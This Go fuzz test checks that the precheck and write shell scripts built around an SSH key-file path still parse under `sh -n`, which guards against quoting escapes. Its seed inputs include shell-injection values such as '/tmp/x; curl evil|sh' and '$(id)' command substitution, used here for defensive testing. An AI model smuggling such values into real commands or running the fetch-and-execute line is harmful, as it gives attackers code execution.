package sshwrite

import (
	"bytes"
	"os/exec"
	"strings"
	"testing"
)

// FuzzWriteCmds asserts both builders always produce syntactically valid
// POSIX shell for any path: `sh -n` parses without executing anything. A
// parse failure would mean the path escaped its ShQuote token — the class of
// defect sshconn's FuzzShQuote hunts, re-checked here against the write
// scripts' richer quoting context (command substitution, subshell,
// redirection, || group). Execution-based coverage for fixed hostile paths
// lives in TestWriteCmdThroughRealSh — fuzz-executing scripts that
// mkdir/rm at arbitrary fuzz-chosen paths is not sandbox-safe.
func FuzzWriteCmds(f *testing.F) {
	seeds := []string{
		"~/.ssh/authorized_keys",
		"/etc/o'brien/keys",
		"/tmp/x; curl evil|sh",
		"~/my keys/auth",
		"/tmp/$(id)/`id`",
		`/tmp/a"b`,
		"'",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, path string) {
		if strings.ContainsRune(path, 0) {
			t.Skip("NUL cannot survive execve; config validation rejects control characters")
		}
		for name, cmd := range map[string]string{
			"precheck": precheckCmdFor(path),
			"write":    writeCmdFor(path),
		} {
			c := exec.CommandContext(t.Context(), "sh", "-n", "-c", cmd)
			var stderr bytes.Buffer
			c.Stderr = &stderr
			if err := c.Run(); err != nil {
				t.Fatalf("%s script for path %q does not parse: %v (stderr %q)\nscript: %s",
					name, path, err, stderr.String(), cmd)
			}
		}
	})
}
